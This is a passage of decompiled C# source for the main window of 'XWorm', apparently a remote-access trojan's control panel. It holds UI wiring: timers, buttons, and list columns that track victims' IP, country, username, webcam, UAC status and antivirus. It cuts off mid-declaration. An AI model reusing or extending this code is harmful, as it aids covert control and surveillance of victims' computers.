using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using XWorm.My;
using XWorm.My.Resources;

namespace XWorm
{
	// Token: 0x02000016 RID: 22
	[DesignerGenerated]
	public partial class Main : Form
	{
		// Token: 0x17000106 RID: 262
		// (get) Token: 0x060002AE RID: 686 RVA: 0x00021126 File Offset: 0x0001F326
		// (set) Token: 0x060002AF RID: 687 RVA: 0x00021130 File Offset: 0x0001F330
		internal virtual StatusStrip StatusStrip1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000107 RID: 263
		// (get) Token: 0x060002B0 RID: 688 RVA: 0x00021139 File Offset: 0x0001F339
		// (set) Token: 0x060002B1 RID: 689 RVA: 0x00021143 File Offset: 0x0001F343
		internal virtual ToolStripStatusLabel ToolStripStatusLabel1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000108 RID: 264
		// (get) Token: 0x060002B2 RID: 690 RVA: 0x0002114C File Offset: 0x0001F34C
		// (set) Token: 0x060002B3 RID: 691 RVA: 0x00021158 File Offset: 0x0001F358
		internal virtual System.Windows.Forms.Timer Timer_Ping
		{
			[CompilerGenerated]
			get
			{
				return this._Timer_Ping;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer_Ping_Tick);
				System.Windows.Forms.Timer timer_Ping = this._Timer_Ping;
				if (timer_Ping != null)
				{
					timer_Ping.Tick -= value2;
				}
				this._Timer_Ping = value;
				timer_Ping = this._Timer_Ping;
				if (timer_Ping != null)
				{
					timer_Ping.Tick += value2;
				}
			}
		}

		// Token: 0x17000109 RID: 265
		// (get) Token: 0x060002B4 RID: 692 RVA: 0x0002119B File Offset: 0x0001F39B
		// (set) Token: 0x060002B5 RID: 693 RVA: 0x000211A8 File Offset: 0x0001F3A8
		internal virtual System.Windows.Forms.Timer Timer_Status
		{
			[CompilerGenerated]
			get
			{
				return this._Timer_Status;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer_Status_Tick);
				System.Windows.Forms.Timer timer_Status = this._Timer_Status;
				if (timer_Status != null)
				{
					timer_Status.Tick -= value2;
				}
				this._Timer_Status = value;
				timer_Status = this._Timer_Status;
				if (timer_Status != null)
				{
					timer_Status.Tick += value2;
				}
			}
		}

		// Token: 0x1700010A RID: 266
		// (get) Token: 0x060002B6 RID: 694 RVA: 0x000211EB File Offset: 0x0001F3EB
		// (set) Token: 0x060002B7 RID: 695 RVA: 0x000211F8 File Offset: 0x0001F3F8
		internal virtual NotifyIcon NotifyIcon1
		{
			[CompilerGenerated]
			get
			{
				return this._NotifyIcon1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				MouseEventHandler value2 = new MouseEventHandler(this.NotifyIcon1_MouseDoubleClick);
				NotifyIcon notifyIcon = this._NotifyIcon1;
				if (notifyIcon != null)
				{
					notifyIcon.MouseDoubleClick -= value2;
				}
				this._NotifyIcon1 = value;
				notifyIcon = this._NotifyIcon1;
				if (notifyIcon != null)
				{
					notifyIcon.MouseDoubleClick += value2;
				}
			}
		}

		// Token: 0x1700010B RID: 267
		// (get) Token: 0x060002B8 RID: 696 RVA: 0x0002123B File Offset: 0x0001F43B
		// (set) Token: 0x060002B9 RID: 697 RVA: 0x00021245 File Offset: 0x0001F445
		private virtual PerformanceCounter performanceCounter2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700010C RID: 268
		// (get) Token: 0x060002BA RID: 698 RVA: 0x0002124E File Offset: 0x0001F44E
		// (set) Token: 0x060002BB RID: 699 RVA: 0x00021258 File Offset: 0x0001F458
		private virtual PerformanceCounter performanceCounter1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700010D RID: 269
		// (get) Token: 0x060002BC RID: 700 RVA: 0x00021261 File Offset: 0x0001F461
		// (set) Token: 0x060002BD RID: 701 RVA: 0x0002126B File Offset: 0x0001F46B
		internal virtual ImageList ii { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700010E RID: 270
		// (get) Token: 0x060002BE RID: 702 RVA: 0x00021274 File Offset: 0x0001F474
		// (set) Token: 0x060002BF RID: 703 RVA: 0x0002127E File Offset: 0x0001F47E
		internal virtual LV Lv2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700010F RID: 271
		// (get) Token: 0x060002C0 RID: 704 RVA: 0x00021287 File Offset: 0x0001F487
		// (set) Token: 0x060002C1 RID: 705 RVA: 0x00021291 File Offset: 0x0001F491
		internal virtual ColumnHeader ColumnHeader16 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000110 RID: 272
		// (get) Token: 0x060002C2 RID: 706 RVA: 0x0002129A File Offset: 0x0001F49A
		// (set) Token: 0x060002C3 RID: 707 RVA: 0x000212A4 File Offset: 0x0001F4A4
		internal virtual ColumnHeader ColumnHeader17 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000111 RID: 273
		// (get) Token: 0x060002C4 RID: 708 RVA: 0x000212AD File Offset: 0x0001F4AD
		// (set) Token: 0x060002C5 RID: 709 RVA: 0x000212B8 File Offset: 0x0001F4B8
		public virtual LV Lv1
		{
			[CompilerGenerated]
			get
			{
				return this._Lv1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				MouseEventHandler value2 = new MouseEventHandler(this.Lv1_MouseMove);
				KeyEventHandler value3 = new KeyEventHandler(this.Lv1_KeyDown);
				EventHandler value4 = new EventHandler(this.Lv1_SelectedIndexChanged);
				LV lv = this._Lv1;
				if (lv != null)
				{
					lv.MouseMove -= value2;
					lv.KeyDown -= value3;
					lv.SelectedIndexChanged -= value4;
				}
				this._Lv1 = value;
				lv = this._Lv1;
				if (lv != null)
				{
					lv.MouseMove += value2;
					lv.KeyDown += value3;
					lv.SelectedIndexChanged += value4;
				}
			}
		}

		// Token: 0x17000112 RID: 274
		// (get) Token: 0x060002C6 RID: 710 RVA: 0x00021331 File Offset: 0x0001F531
		// (set) Token: 0x060002C7 RID: 711 RVA: 0x0002133B File Offset: 0x0001F53B
		internal virtual LV Lv3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000113 RID: 275
		// (get) Token: 0x060002C8 RID: 712 RVA: 0x00021344 File Offset: 0x0001F544
		// (set) Token: 0x060002C9 RID: 713 RVA: 0x0002134E File Offset: 0x0001F54E
		internal virtual ColumnHeader ColumnHeader12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000114 RID: 276
		// (get) Token: 0x060002CA RID: 714 RVA: 0x00021357 File Offset: 0x0001F557
		// (set) Token: 0x060002CB RID: 715 RVA: 0x00021361 File Offset: 0x0001F561
		internal virtual ColumnHeader ColumnHeader13 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000115 RID: 277
		// (get) Token: 0x060002CC RID: 716 RVA: 0x0002136A File Offset: 0x0001F56A
		// (set) Token: 0x060002CD RID: 717 RVA: 0x00021374 File Offset: 0x0001F574
		private virtual System.Windows.Forms.Timer TimerTask
		{
			[CompilerGenerated]
			get
			{
				return this._TimerTask;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.TimerTask_Tick);
				System.Windows.Forms.Timer timerTask = this._TimerTask;
				if (timerTask != null)
				{
					timerTask.Tick -= value2;
				}
				this._TimerTask = value;
				timerTask = this._TimerTask;
				if (timerTask != null)
				{
					timerTask.Tick += value2;
				}
			}
		}

		// Token: 0x17000116 RID: 278
		// (get) Token: 0x060002CE RID: 718 RVA: 0x000213B7 File Offset: 0x0001F5B7
		// (set) Token: 0x060002CF RID: 719 RVA: 0x000213C4 File Offset: 0x0001F5C4
		private virtual System.Windows.Forms.Timer ThumbnailCap
		{
			[CompilerGenerated]
			get
			{
				return this._ThumbnailCap;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ThumbnailCap_Tick);
				System.Windows.Forms.Timer thumbnailCap = this._ThumbnailCap;
				if (thumbnailCap != null)
				{
					thumbnailCap.Tick -= value2;
				}
				this._ThumbnailCap = value;
				thumbnailCap = this._ThumbnailCap;
				if (thumbnailCap != null)
				{
					thumbnailCap.Tick += value2;
				}
			}
		}

		// Token: 0x17000117 RID: 279
		// (get) Token: 0x060002D0 RID: 720 RVA: 0x00021407 File Offset: 0x0001F607
		// (set) Token: 0x060002D1 RID: 721 RVA: 0x00021411 File Offset: 0x0001F611
		internal virtual ImageList ImageList1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000118 RID: 280
		// (get) Token: 0x060002D2 RID: 722 RVA: 0x0002141A File Offset: 0x0001F61A
		// (set) Token: 0x060002D3 RID: 723 RVA: 0x00021424 File Offset: 0x0001F624
		internal virtual ListView Lv4
		{
			[CompilerGenerated]
			get
			{
				return this._Lv4;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Lv4_SelectedIndexChanged);
				ListView lv = this._Lv4;
				if (lv != null)
				{
					lv.SelectedIndexChanged -= value2;
				}
				this._Lv4 = value;
				lv = this._Lv4;
				if (lv != null)
				{
					lv.SelectedIndexChanged += value2;
				}
			}
		}

		// Token: 0x17000119 RID: 281
		// (get) Token: 0x060002D4 RID: 724 RVA: 0x00021467 File Offset: 0x0001F667
		// (set) Token: 0x060002D5 RID: 725 RVA: 0x00021471 File Offset: 0x0001F671
		public virtual ColumnHeader _IP { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700011A RID: 282
		// (get) Token: 0x060002D6 RID: 726 RVA: 0x0002147A File Offset: 0x0001F67A
		// (set) Token: 0x060002D7 RID: 727 RVA: 0x00021484 File Offset: 0x0001F684
		public virtual ColumnHeader _Country { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700011B RID: 283
		// (get) Token: 0x060002D8 RID: 728 RVA: 0x0002148D File Offset: 0x0001F68D
		// (set) Token: 0x060002D9 RID: 729 RVA: 0x00021497 File Offset: 0x0001F697
		public virtual ColumnHeader _ID { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700011C RID: 284
		// (get) Token: 0x060002DA RID: 730 RVA: 0x000214A0 File Offset: 0x0001F6A0
		// (set) Token: 0x060002DB RID: 731 RVA: 0x000214AA File Offset: 0x0001F6AA
		public virtual ColumnHeader _Username { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700011D RID: 285
		// (get) Token: 0x060002DC RID: 732 RVA: 0x000214B3 File Offset: 0x0001F6B3
		// (set) Token: 0x060002DD RID: 733 RVA: 0x000214BD File Offset: 0x0001F6BD
		public virtual ColumnHeader _Operating { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700011E RID: 286
		// (get) Token: 0x060002DE RID: 734 RVA: 0x000214C6 File Offset: 0x0001F6C6
		// (set) Token: 0x060002DF RID: 735 RVA: 0x000214D0 File Offset: 0x0001F6D0
		public virtual ColumnHeader _Group { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700011F RID: 287
		// (get) Token: 0x060002E0 RID: 736 RVA: 0x000214D9 File Offset: 0x0001F6D9
		// (set) Token: 0x060002E1 RID: 737 RVA: 0x000214E3 File Offset: 0x0001F6E3
		public virtual ColumnHeader _Date { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000120 RID: 288
		// (get) Token: 0x060002E2 RID: 738 RVA: 0x000214EC File Offset: 0x0001F6EC
		// (set) Token: 0x060002E3 RID: 739 RVA: 0x000214F6 File Offset: 0x0001F6F6
		public virtual ColumnHeader _USB { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000121 RID: 289
		// (get) Token: 0x060002E4 RID: 740 RVA: 0x000214FF File Offset: 0x0001F6FF
		// (set) Token: 0x060002E5 RID: 741 RVA: 0x00021509 File Offset: 0x0001F709
		public virtual ColumnHeader _UAC { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000122 RID: 290
		// (get) Token: 0x060002E6 RID: 742 RVA: 0x00021512 File Offset: 0x0001F712
		// (set) Token: 0x060002E7 RID: 743 RVA: 0x0002151C File Offset: 0x0001F71C
		public virtual ColumnHeader _Cam { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000123 RID: 291
		// (get) Token: 0x060002E8 RID: 744 RVA: 0x00021525 File Offset: 0x0001F725
		// (set) Token: 0x060002E9 RID: 745 RVA: 0x0002152F File Offset: 0x0001F72F
		internal virtual ImageList ImageList2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000124 RID: 292
		// (get) Token: 0x060002EA RID: 746 RVA: 0x00021538 File Offset: 0x0001F738
		// (set) Token: 0x060002EB RID: 747 RVA: 0x00021542 File Offset: 0x0001F742
		public virtual ColumnHeader _CPU { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000125 RID: 293
		// (get) Token: 0x060002EC RID: 748 RVA: 0x0002154B File Offset: 0x0001F74B
		// (set) Token: 0x060002ED RID: 749 RVA: 0x00021555 File Offset: 0x0001F755
		public virtual ColumnHeader _GPU { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000126 RID: 294
		// (get) Token: 0x060002EE RID: 750 RVA: 0x0002155E File Offset: 0x0001F75E
		// (set) Token: 0x060002EF RID: 751 RVA: 0x00021568 File Offset: 0x0001F768
		public virtual ColumnHeader _Ram { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000127 RID: 295
		// (get) Token: 0x060002F0 RID: 752 RVA: 0x00021571 File Offset: 0x0001F771
		// (set) Token: 0x060002F1 RID: 753 RVA: 0x0002157B File Offset: 0x0001F77B
		public virtual ColumnHeader _Antivirus { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000128 RID: 296
		// (get) Token: 0x060002F2 RID: 754 RVA: 0x00021584 File Offset: 0x0001F784
		// (set) Token: 0x060002F3 RID: 755 RVA: 0x0002158E File Offset: 0x0001F78E
		public virtual ColumnHeader _Note { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000129 RID: 297
		// (get) Token: 0x060002F4 RID: 756 RVA: 0x00021597 File Offset: 0x0001F797
		// (set) Token: 0x060002F5 RID: 757 RVA: 0x000215A1 File Offset: 0x0001F7A1
		public virtual ColumnHeader _idle { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700012A RID: 298
		// (get) Token: 0x060002F6 RID: 758 RVA: 0x000215AA File Offset: 0x0001F7AA
		// (set) Token: 0x060002F7 RID: 759 RVA: 0x000215B4 File Offset: 0x0001F7B4
		internal virtual Guna2Panel Guna2Panel6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700012B RID: 299
		// (get) Token: 0x060002F8 RID: 760 RVA: 0x000215BD File Offset: 0x0001F7BD
		// (set) Token: 0x060002F9 RID: 761 RVA: 0x000215C8 File Offset: 0x0001F7C8
		internal virtual Guna2Button Guna2Button5
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2Button5;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2Button5_Click);
				Guna2Button guna2Button = this._Guna2Button5;
				if (guna2Button != null)
				{
					guna2Button.Click -= value2;
				}
				this._Guna2Button5 = value;
				guna2Button = this._Guna2Button5;
				if (guna2Button != null)
				{
					guna2Button.Click += value2;
				}
			}
		}

		// Token: 0x1700012C RID: 300
		// (get) Token: 0x060002FA RID: 762 RVA: 0x0002160B File Offset: 0x0001F80B
		// (set) Token: 0x060002FB RID: 763 RVA: 0x00021618 File Offset: 0x0001F818
		internal virtual Guna2Button Guna2Button4
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2Button4;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2Button4_Click);
				Guna2Button guna2Button = this._Guna2Button4;
				if (guna2Button != null)
				{
					guna2Button.Click -= value2;
				}
				this._Guna2Button4 = value;
				guna2Button = this._Guna2Button4;
				if (guna2Button != null)
				{
					guna2Button.Click += value2;
				}
			}
		}

		// Token: 0x1700012D RID: 301
		// (get) Token: 0x060002FC RID: 764 RVA: 0x0002165B File Offset: 0x0001F85B
		// (set) Token: 0x060002FD RID: 765 RVA: 0x00021668 File Offset: 0x0001F868
		internal virtual Guna2Button Guna2Button3
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2Button3;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2Button3_Click);
				Guna2Button guna2Button = this._Guna2Button3;
				if (guna2Button != null)
				{
					guna2Button.Click -= value2;
				}
				this._Guna2Button3 = value;
				guna2Button = this._Guna2Button3;
				if (guna2Button != null)
				{
					guna2Button.Click += value2;
				}
			}
		}

		// Token: 0x1700012E RID: 302
		// (get) Token: 0x060002FE RID: 766 RVA: 0x000216AB File Offset: 0x0001F8AB
		// (set) Token: 0x060002FF RID: 767 RVA: 0x000216B8 File Offset: 0x0001F8B8
		internal virtual Guna2Button Guna2Button2
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2Button2;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2Button2_Click);
				Guna2Button guna2Button = this._Guna2Button2;
				if (guna2Button != null)
				{
					guna2Button.Click -= value2;
				}
				this._Guna2Button2 = value;
				guna2Button = this._Guna2Button2;
				if (guna2Button != null)
				{
					guna2Button.Click += value2;
				}
			}
		}

		// Token: 0x1700012F RID: 303
		// (get) Token: 0x06000300 RID: 768 RVA: 0x000216FB File Offset: 0x0001F8FB
		// (set) Token: 0x06000301 RID: 769 RVA: 0x00021708 File Offset: 0x0001F908
		internal virtual Guna2Button Guna2Button1
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2Button1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2Button1_Click);
				Guna2Button guna2Button = this._Guna2Button1;
				if (guna2Button != null)
				{
					guna2Button.Click -= value2;
				}
				this._Guna2Button1 = value;
				guna2Button = this._Guna2Button1;
				if (guna2Button != null)
				{
					guna2Button.Click += value2;
				}
			}
		}

		// Token: 0x17000130 RID: 304
		// (get) Token: 0x06000302 RID: 770 RVA: 0x0002174B File Offset: 0x0001F94B
		// (set) Token: 0x06000303 RID: 771 RVA: 0x00021755 File Offset: 0x0001F955
		internal virtual Guna2Panel Guna2Panel2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000131 RID: 305
		// (get) Token: 0x06000304 RID: 772 RVA: 0x0002175E File Offset: 0x0001F95E
		// (set) Token: 0x06000305 RID: 773 RVA: 0x00021768 File Offset: 0x0001F968
		internal virtual Guna2TextBox Guna2TextBox1
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2TextBox1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Guna2TextBox1_TextChanged);
				KeyEventHandler value2 = new KeyEventHandler(this.Guna2TextBox1_KeyDown);
				Guna2TextBox guna2TextBox = this._Guna2TextBox1;
				if (guna2TextBox != null)
				{
					guna2TextBox.TextChanged -= eventHandler;
					guna2TextBox.KeyDown -= value2;
				}
				this._Guna2TextBox1 = value;
				guna2TextBox = this._Guna2TextBox1;
				if (guna2TextBox != null)
				{
					guna2TextBox.TextChanged += eventHandler;
					guna2TextBox.KeyDown += value2;
				}
			}
		}

		// Token: 0x17000132 RID: 306
		// (get) Token: 0x06000306 RID: 774 RVA: 0x000217C6 File Offset: 0x0001F9C6
		// (set) Token: 0x06000307 RID: 775 RVA: 0x000217D0 File Offset: 0x0001F9D0
		internal virtual Guna2Panel Guna2Panel3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000133 RID: 307
		// (get) Token: 0x06000308 RID: 776 RVA: 0x000217D9 File Offset: 0x0001F9D9
		// (set) Token: 0x06000309 RID: 777 RVA: 0x000217E3 File Offset: 0x0001F9E3
		internal virtual Guna2Panel Guna2Panel4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000134 RID: 308
		// (get) Token: 0x0600030A RID: 778 RVA: 0x000217EC File Offset: 0x0001F9EC
		// (set) Token: 0x0600030B RID: 779 RVA: 0x000217F6 File Offset: 0x0001F9F6
		internal virtual Guna2NotificationPaint Guna2NotificationPaint1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000135 RID: 309
		// (get) Token: 0x0600030C RID: 780 RVA: 0x000217FF File Offset: 0x0001F9FF
		// (set) Token: 0x0600030D RID: 781 RVA: 0x0002180C File Offset: 0x0001FA0C
		internal virtual Guna2ContextMenuStrip Guna2ContextMenuStrip5
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2ContextMenuStrip5;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				CancelEventHandler value2 = new CancelEventHandler(this.Guna2ContextMenuStrip5_Opening);
				Guna2ContextMenuStrip guna2ContextMenuStrip = this._Guna2ContextMenuStrip5;
				if (guna2ContextMenuStrip != null)
				{
					guna2ContextMenuStrip.Opening -= value2;
				}
				this._Guna2ContextMenuStrip5 = value;
				guna2ContextMenuStrip = this._Guna2ContextMenuStrip5;
				if (guna2ContextMenuStrip != null)
				{
					guna2ContextMenuStrip.Opening += value2;
				}
			}
		}

		// Token: 0x17000136 RID: 310
		// (get) Token: 0x0600030E RID: 782 RVA: 0x0002184F File Offset: 0x0001FA4F
		// (set) Token: 0x0600030F RID: 783 RVA: 0x0002185C File Offset: 0x0001FA5C
		internal virtual ToolStripMenuItem ShowToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._ShowToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ShowToolStripMenuItem_Click);
				ToolStripMenuItem showToolStripMenuItem = this._ShowToolStripMenuItem;
				if (showToolStripMenuItem != null)
				{
					showToolStripMenuItem.Click -= value2;
				}
				this._ShowToolStripMenuItem = value;
				showToolStripMenuItem = this._ShowToolStripMenuItem;
				if (showToolStripMenuItem != null)
				{
					showToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000137 RID: 311
		// (get) Token: 0x06000310 RID: 784 RVA: 0x0002189F File Offset: 0x0001FA9F
		// (set) Token: 0x06000311 RID: 785 RVA: 0x000218AC File Offset: 0x0001FAAC
		internal virtual ToolStripMenuItem RestartToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._RestartToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RestartToolStripMenuItem1_Click_1);
				ToolStripMenuItem restartToolStripMenuItem = this._RestartToolStripMenuItem1;
				if (restartToolStripMenuItem != null)
				{
					restartToolStripMenuItem.Click -= value2;
				}
				this._RestartToolStripMenuItem1 = value;
				restartToolStripMenuItem = this._RestartToolStripMenuItem1;
				if (restartToolStripMenuItem != null)
				{
					restartToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000138 RID: 312
		// (get) Token: 0x06000312 RID: 786 RVA: 0x000218EF File Offset: 0x0001FAEF
		// (set) Token: 0x06000313 RID: 787 RVA: 0x000218FC File Offset: 0x0001FAFC
		internal virtual ToolStripMenuItem ExitToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._ExitToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ExitToolStripMenuItem_Click_1);
				ToolStripMenuItem exitToolStripMenuItem = this._ExitToolStripMenuItem;
				if (exitToolStripMenuItem != null)
				{
					exitToolStripMenuItem.Click -= value2;
				}
				this._ExitToolStripMenuItem = value;
				exitToolStripMenuItem = this._ExitToolStripMenuItem;
				if (exitToolStripMenuItem != null)
				{
					exitToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000139 RID: 313
		// (get) Token: 0x06000314 RID: 788 RVA: 0x0002193F File Offset: 0x0001FB3F
		// (set) Token: 0x06000315 RID: 789 RVA: 0x00021949 File Offset: 0x0001FB49
		internal virtual Guna2ContextMenuStrip Guna2ContextMenuStrip4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700013A RID: 314
		// (get) Token: 0x06000316 RID: 790 RVA: 0x00021952 File Offset: 0x0001FB52
		// (set) Token: 0x06000317 RID: 791 RVA: 0x0002195C File Offset: 0x0001FB5C
		internal virtual ToolStripMenuItem ToolStripMenuItem4
		{
			[CompilerGenerated]
			get
			{
				return this._ToolStripMenuItem4;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem4_Click);
				ToolStripMenuItem toolStripMenuItem = this._ToolStripMenuItem4;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click -= value2;
				}
				this._ToolStripMenuItem4 = value;
				toolStripMenuItem = this._ToolStripMenuItem4;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700013B RID: 315
		// (get) Token: 0x06000318 RID: 792 RVA: 0x0002199F File Offset: 0x0001FB9F
		// (set) Token: 0x06000319 RID: 793 RVA: 0x000219AC File Offset: 0x0001FBAC
		internal virtual ToolStripMenuItem ToolStripMenuItem6
		{
			[CompilerGenerated]
			get
			{
				return this._ToolStripMenuItem6;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem6_Click);
				ToolStripMenuItem toolStripMenuItem = this._ToolStripMenuItem6;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click -= value2;
				}
				this._ToolStripMenuItem6 = value;
				toolStripMenuItem = this._ToolStripMenuItem6;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700013C RID: 316
		// (get) Token: 0x0600031A RID: 794 RVA: 0x000219EF File Offset: 0x0001FBEF
		// (set) Token: 0x0600031B RID: 795 RVA: 0x000219F9 File Offset: 0x0001FBF9
		internal virtual Guna2ContextMenuStrip Guna2ContextMenuStrip2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700013D RID: 317
		// (get) Token: 0x0600031C RID: 796 RVA: 0x00021A02 File Offset: 0x0001FC02
		// (set) Token: 0x0600031D RID: 797 RVA: 0x00021A0C File Offset: 0x0001FC0C
		internal virtual ToolStripMenuItem ToolStripMenuItem7
		{
			[CompilerGenerated]
			get
			{
				return this._ToolStripMenuItem7;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem7_Click);
				ToolStripMenuItem toolStripMenuItem = this._ToolStripMenuItem7;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click -= value2;
				}
				this._ToolStripMenuItem7 = value;
				toolStripMenuItem = this._ToolStripMenuItem7;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700013E RID: 318
		// (get) Token: 0x0600031E RID: 798 RVA: 0x00021A4F File Offset: 0x0001FC4F
		// (set) Token: 0x0600031F RID: 799 RVA: 0x00021A59 File Offset: 0x0001FC59
		internal virtual Guna2HtmlToolTip Guna2HtmlToolTip1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700013F RID: 319
		// (get) Token: 0x06000320 RID: 800 RVA: 0x00021A62 File Offset: 0x0001FC62
		// (set) Token: 0x06000321 RID: 801 RVA: 0x00021A6C File Offset: 0x0001FC6C
		internal virtual Guna2Button Guna2Button6
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2Button6;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2Button6_Click);
				Guna2Button guna2Button = this._Guna2Button6;
				if (guna2Button != null)
				{
					guna2Button.Click -= value2;
				}
				this._Guna2Button6 = value;
				guna2Button = this._Guna2Button6;
				if (guna2Button != null)
				{
					guna2Button.Click += value2;
				}
			}
		}

		// Token: 0x17000140 RID: 320
		// (get) Token: 0x06000322 RID: 802 RVA: 0x00021AAF File Offset: 0x0001FCAF
